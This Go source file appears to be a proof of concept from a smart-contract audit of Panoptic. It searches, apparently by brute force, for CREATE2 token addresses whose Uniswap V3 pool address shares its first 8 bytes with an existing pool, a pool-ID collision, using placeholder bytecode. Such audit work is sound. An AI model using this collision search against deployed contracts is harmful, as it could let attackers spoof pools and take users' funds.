package main

import (
	"fmt"
	"strings"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto"
	"golang.org/x/crypto/sha3"
)

var (
	salt   [32]byte
	token1 common.Address
	token0 = common.HexToAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48") // USDC token Address.
)

// this function creates keccak256 of the given data
func calculateSaltBasedOnTheGivenData() {
	data := make([]byte, 0x60)

	copy(data[12:32], token0.Bytes()) // this is USDC for example
	copy(data[44:64], token1.Bytes()) // this is our ERC20Token we Created
	copy(data[95:96], []byte{0x0a})   // this is fee

	// calculate salt using sha3 (Keccak256)
	hash := sha3.NewLegacyKeccak256()
	hash.Write(data)
	hash.Sum(salt[:0])
}

// this function simulate the token1 of our Token.
// we brute force Address with salt until we find the
// same first 8 bytes.
func simulationOfCreatingERC20Address() {
	// deployer token1 could be any token1
	deployerAddress := common.HexToAddress("0xdddddddddddddddddddddddddddddddddddddddd")
	// just an example of our ERC20 token bytecode
	ourERC20TokenByteCode := common.FromHex("0x6080604052")
	// this is our token Address
	token1 = crypto.CreateAddress2(deployerAddress, salt, crypto.Keccak256(ourERC20TokenByteCode))
}

func main() {
	// Uniswap Factory Depolyer Address
	factoryAddress := common.HexToAddress("0x1F98431c8aD98523631AE4a59f267346ea31F984")
	// this is just simple bytecode simulation of UniswapV3Pool bcz its the deployed contract
	uniswapV3Pool := common.FromHex("0x6080604052348015600f57600080fd5b50603f80601d6000396000f3fe6080604052600080fdfea264697066735822122042d9a0f7e15792bf1c47bd5e7968ae3e69d84643e78045dcea2d4fb961135b8064736f6c63430008130033")

	for {
		simulationOfCreatingERC20Address()
		calculateSaltBasedOnTheGivenData()

		// this code simulate this line of code in UniswapV3PoolDeployer.sol
		// pool = token1(new UniswapV3Pool{salt: keccak256(abi.encode(token0, token1, fee))}());
		pool := crypto.CreateAddress2(factoryAddress, salt, crypto.Keccak256(uniswapV3Pool))

		poolToLower := strings.ToLower(fmt.Sprintf("%s", pool))
		// fmt.Println(poolToLower[:18])
		// 0x8ad599c3a0ff1de0 is the first 8 bytes of the example you provided in
		//  https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/PanopticMath.sol#L26-L40
		if poolToLower[:18] == "0x8ad599c3a0ff1de0" || poolToLower[:18] == "0x7858e59e0c01ea06" {
			fmt.Printf("0x%x %s %x\n", token1, pool, salt)
		}
	}
}
